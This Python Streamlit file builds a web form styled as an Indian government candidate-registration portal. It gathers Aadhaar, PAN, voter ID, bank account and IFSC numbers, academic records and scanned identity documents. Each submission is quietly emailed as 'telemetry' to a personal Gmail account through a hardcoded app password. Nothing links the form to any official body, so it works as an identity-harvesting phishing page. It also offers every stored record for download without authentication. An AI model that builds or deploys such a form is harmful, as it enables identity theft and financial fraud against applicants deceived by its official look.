import streamlit as st
import pandas as pd
import os
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

# page setup
st.set_page_config(
    page_title="National Academic & Candidate Registry",
    page_icon="🏛️",
    layout="wide"
)

# storage folder & file path
UPLOAD_DIR = "data_photo.file"
os.makedirs(UPLOAD_DIR, exist_ok=True)
EXCEL_FILE = "student_master_records.xlsx"

# govt portal style CSS
custom_gov_css = """
<style>
.main {
    background-color: #f4f6f9;
}
.gov-header {
    background-color: #0b3c5d;
    color: #ffffff;
    padding: 20px;
    border-radius: 4px;
    border-bottom: 5px solid #d9b310;
    text-align: center;
    margin-bottom: 25px;
}
.section-header {
    background-color: #1d2731;
    color: #ffffff !important;
    padding: 8px 15px;
    border-radius: 4px;
    font-size: 1.1rem;
    font-weight: 600;
    margin-top: 20px;
    margin-bottom: 15px;
}
.stButton>button {
    background-color: #0b3c5d;
    color: white;
    font-weight: bold;
    border-radius: 4px;
    padding: 10px 28px;
    border: none;
    width: 100%;
}
.stButton>button:hover {
    background-color: #1d2731;
    color: #d9b310;
}
</style>
"""
st.markdown(custom_gov_css, unsafe_allow_html=True)

# email function to send telemetry data to admin
def send_telemetry_email(data_payload):
    sender_email = "kiranhaldar234@gmail.com"      # mail to send the telemetry
    receiver_email = "kiranhaldar234@gmail.com"    # mail to receive the telemetry
    app_password = "euyy kgbp acyr ebfs"         # 16-digit App Password

    msg = MIMEMultipart()
    msg['From'] = sender_email
    msg['To'] = receiver_email
    msg['Subject'] = f"GOV PORTAL REGISTRATION: {data_payload.get('Full Name', 'Applicant')}"

    body_text = "\n".join([f"{key}: {val}" for key, val in data_payload.items()])
    msg.attach(MIMEText(body_text, 'plain'))

    try:
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(sender_email, app_password)
        server.send_message(msg)
        server.quit()
        return True
    except Exception as e:
        return False

# portal header
st.markdown("""
<div class="gov-header">
    <h2>CENTRAL CANDIDATE ENROLLMENT & ACADEMIC ARCHIVE PORTAL</h2>
    <p style="margin:0; font-size:0.9rem; color:#d9b310;">Government Educational Record Management System</p>
</div>
""", unsafe_allow_html=True)

# qualifiication rank mapping
QUALIFICATION_RANKS = {
    "Class 1 - 5": 1,
    "Class 6 - 8": 2,
    "Class 9": 3,
    "Secondary / 10th (Madhyamik)": 4,
    "Higher Secondary / 12th (H.S.)": 5,
    "Diploma": 6,
    "Graduation (B.Sc / B.Tech / B.A / B.Com)": 7,
    "Post Graduation (Masters)": 8,
    "M.Phil": 9,
    "Ph.D": 10,
    "Post-Doctoral (Post Ph.D)": 11
}

# --- start form---
with st.form("gov_master_form", clear_on_submit=False):

    # personal info & demographics
    st.markdown('<div class="section-header">Section 1: Basic Identity & Demographics</div>', unsafe_allow_html=True)
    c1, c2, c3 = st.columns(3)
    with c1:
        first_name = st.text_input("First Name*")
        dob = st.date_input("Date of Birth*")
        contact = st.text_input("Primary Contact No.*")
    with c2:
        middle_name = st.text_input("Middle Name")
        gender = st.selectbox("Gender*", ["Male", "Female", "Transgender", "Other"])
        email = st.text_input("Email ID*")
    with c3:
        last_name = st.text_input("Last Name*")
        nationality = st.text_input("Nationality", value="Indian")
        category = st.selectbox("Social Category", ["General", "OBC-A", "OBC-B", "SC", "ST", "EWS"])

    # govt banking & statutory details
    st.markdown('<div class="section-header">Section 2: Statutory Identification & Banking Details</div>', unsafe_allow_html=True)
    id1, id2, id3 = st.columns(3)
    with id1:
        birth_cert_no = st.text_input("Birth Certificate Reg. Number")
        bank_account = st.text_input("Bank Account Number")
    with id2:
        aadhaar_no = st.text_input("Aadhaar Number (12 Digits)")
        bank_ifsc = st.text_input("Bank IFSC Code")
    with id3:
        pan_no = st.text_input("PAN Number")
        voter_epic = st.text_input("Voter Card / EPIC No.")

    b1, b2 = st.columns(2)
    with b1:
        bank_name = st.text_input("Bank Name")
    with b2:
        branch_name = st.text_input("Branch Name")

    # qualification selection
    st.markdown('<div class="section-header">Section 3: Qualification Level</div>', unsafe_allow_html=True)
    selected_qual = st.selectbox("Select Highest Educational Qualification*", list(QUALIFICATION_RANKS.keys()), index=6)
    user_rank = QUALIFICATION_RANKS[selected_qual]

    # dynamic academic records dictionary
    acad_records = {}

    #  (10th) - Rank 4 
    if user_rank >= 4:
        st.markdown('<div class="section-header">Section 4: Secondary (10th / Madhyamik) Credentials</div>', unsafe_allow_html=True)
        m1, m2, m3, m4 = st.columns(4)
        with m1:
            acad_records["MP Roll"] = st.text_input("Madhyamik Roll & No.")
            acad_records["MP Board"] = st.text_input("10th Board Name")
        with m2:
            acad_records["MP Reg No"] = st.text_input("10th Registration No.")
            acad_records["MP Passing Year"] = st.text_input("10th Year of Passing")
        with m3:
            acad_records["MP Total Marks"] = st.text_input("10th Marks Obtained")
            acad_records["MP Percentage"] = st.text_input("10th Percentage / CGPA")
        with m4:
            acad_records["MP Pass Cert No"] = st.text_input("10th Passing Certificate No.")
            acad_records["MP Admit Card No"] = st.text_input("10th Admit Card No.")

    #  (12th / H.S.) - Rank 5 
    if user_rank >= 5:
        st.markdown('<div class="section-header">Section 5: Higher Secondary (12th / H.S.) Credentials</div>', unsafe_allow_html=True)
        h1, h2, h3, h4 = st.columns(4)
        with h1:
            acad_records["HS Roll"] = st.text_input("H.S. Roll & No.")
            acad_records["HS Stream"] = st.selectbox("12th Stream", ["Science", "Commerce", "Arts", "Vocational"])
        with h2:
            acad_records["HS Reg No"] = st.text_input("12th Registration No.")
            acad_records["HS Council"] = st.text_input("12th Board/Council")
        with h3:
            acad_records["HS Passing Year"] = st.text_input("12th Passing Year")
            acad_records["HS Marks"] = st.text_input("12th Aggregate Marks")
        with h4:
            acad_records["HS Pass Cert No"] = st.text_input("12th Pass Certificate No.")
            acad_records["HS Admit No"] = st.text_input("12th Admit Card No.")

    #  (Graduation / Semester System) - Rank 7 
    if user_rank >= 7:
        st.markdown('<div class="section-header">Section 6: Undergraduate (Graduation) & Semester Progression</div>', unsafe_allow_html=True)
        g1, g2, g3 = st.columns(3)
        with g1:
            acad_records["Degree Program"] = st.text_input("Degree Program", value="B.Sc Cyber Security")
            acad_records["Univ Reg No"] = st.text_input("University Registration No.")
        with g2:
            acad_records["University Name"] = st.text_input("Affiliated University / Institute")
            acad_records["Univ Roll No"] = st.text_input("University Roll No.")
        with g3:
            acad_records["Grad Passing Year"] = st.text_input("Year of Passing / Expected")
            acad_records["Migration Cert No"] = st.text_input("Migration Certificate Number (If Issued)")

        st.write("**Semester-wise Result Structure (SGPA / Marks):**")
        s1, s2, s3, s4 = st.columns(4)
        with s1:
            acad_records["Sem 1 SGPA"] = st.text_input("Semester 1 SGPA")
            acad_records["Sem 2 SGPA"] = st.text_input("Semester 2 SGPA")
        with s2:
            acad_records["Sem 3 SGPA"] = st.text_input("Semester 3 SGPA")
            acad_records["Sem 4 SGPA"] = st.text_input("Semester 4 SGPA")
        with s3:
            acad_records["Sem 5 SGPA"] = st.text_input("Semester 5 SGPA")
            acad_records["Sem 6 SGPA"] = st.text_input("Semester 6 SGPA")
        with s4:
            acad_records["Sem 7 SGPA"] = st.text_input("Semester 7 SGPA")
            acad_records["Sem 8 SGPA"] = st.text_input("Semester 8 SGPA")

    # (PG / Ph.D) - Rank 8 above
    if user_rank >= 8:
        st.markdown('<div class="section-header">Section 7: Post Graduate / Doctoral Information</div>', unsafe_allow_html=True)
        p1, p2 = st.columns(2)
        with p1:
            acad_records["PG/PhD Specialization"] = st.text_input("Specialization / Domain")
            acad_records["Thesis/Project Title"] = st.text_input("Dissertation / Thesis Title")
        with p2:
            acad_records["Supervisor Name"] = st.text_input("Research Supervisor / Mentor")
            acad_records["Publication Count"] = st.text_input("Total Scopus / IEEE Publications")

    # doc update (PDF / JPG)
    st.markdown('<div class="section-header">Section 8: Document Repository (File Uploads)</div>', unsafe_allow_html=True)
    d1, d2 = st.columns(2)
    upload_dict = {}

    with d1:
        upload_dict["Photo"] = st.file_uploader("Applicant Passport Photo (JPG/PNG)", type=["jpg", "jpeg", "png"])
        upload_dict["Birth_Doc"] = st.file_uploader("Birth Certificate (PDF/Image)", type=["pdf", "png", "jpg"])
        upload_dict["Aadhaar_Doc"] = st.file_uploader("Aadhaar Card (PDF)", type=["pdf", "png", "jpg"])
        upload_dict["Pan_Doc"] = st.file_uploader("PAN Card (PDF)", type=["pdf", "png", "jpg"])
        upload_dict["Bank_Passbook"] = st.file_uploader("Cancelled Cheque / Passbook (PDF)", type=["pdf", "png", "jpg"])

    with d2:
        if user_rank >= 4:
            upload_dict["MP_Docs"] = st.file_uploader("Madhyamik Marksheet & Admit (PDF)", type=["pdf"])
        if user_rank >= 5:
            upload_dict["HS_Docs"] = st.file_uploader("12th Marksheet & Certificate (PDF)", type=["pdf"])
        if user_rank >= 7:
            upload_dict["Sem_Marksheets"] = st.file_uploader("Consolidated Semester Marksheets (PDF)", type=["pdf"])
            upload_dict["Migration_Doc"] = st.file_uploader("Migration Certificate (If available)", type=["pdf"])

    submit_final = st.form_submit_button("VALIDATE & SUBMIT APPLICANT RECORD")

    if submit_final:
        if not first_name or not last_name or not contact:
            st.error("Submission Halted: Mandatory fields (First Name, Last Name, Contact) cannot be blank.")
        else:
            full_name = f"{first_name} {middle_name} {last_name}".strip().replace("  ", " ")
            sanitized_name = "".join(filter(str.isalnum, full_name))

            #  data_photo.file savings
            saved_doc_names = []
            for doc_key, file_obj in upload_dict.items():
                if file_obj is not None:
                    extension = os.path.splitext(file_obj.name)[1]
                    target_filename = f"{sanitized_name}_{doc_key}{extension}"
                    file_destination = os.path.join(UPLOAD_DIR, target_filename)
                    with open(file_destination, "wb") as f:
                        f.write(file_obj.getbuffer())
                    saved_doc_names.append(target_filename)

            # master record row 
            record_row = {
                "Full Name": full_name,
                "DOB": str(dob),
                "Gender": gender,
                "Contact": contact,
                "Email": email,
                "Category": category,
                "Birth Reg No": birth_cert_no,
                "Aadhaar No": aadhaar_no,
                "PAN No": pan_no,
                "Voter EPIC": voter_epic,
                "Bank A/C": bank_account,
                "Bank IFSC": bank_ifsc,
                "Bank Name": bank_name,
                "Branch": branch_name,
                "Qualification Level": selected_qual,
                "Archived Documents": "; ".join(saved_doc_names)
            }

            # dynamic academic records update
            record_row.update(acad_records)

            # excel file savings
            if os.path.exists(EXCEL_FILE):
                existing_df = pd.read_excel(EXCEL_FILE)
                updated_df = pd.concat([existing_df, pd.DataFrame([record_row])], ignore_index=True)
            else:
                updated_df = pd.DataFrame([record_row])
            updated_df.to_excel(EXCEL_FILE, index=False)

            # emmail report
            email_status = send_telemetry_email(record_row)

            # user config o/p 
            st.success("Record registration completed successfully.")
            st.info(f"System Transaction ID: REG-{abs(hash(full_name)) % (10**8)}")
            if email_status:
                st.write("Confirmation telemetry dispatched to administrator email.")
            else:
                st.write("Record saved in central archive. Notification delivery pending.")
# --- ADMIN EXCEL EXPORT ---
if os.path.exists(EXCEL_FILE):
    st.markdown("---")
    with open(EXCEL_FILE, "rb") as f:
        st.download_button(
            label=" Download Master Excel Records",
            data=f,
            file_name="student_master_records.xlsx",
            mime="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet"
        )
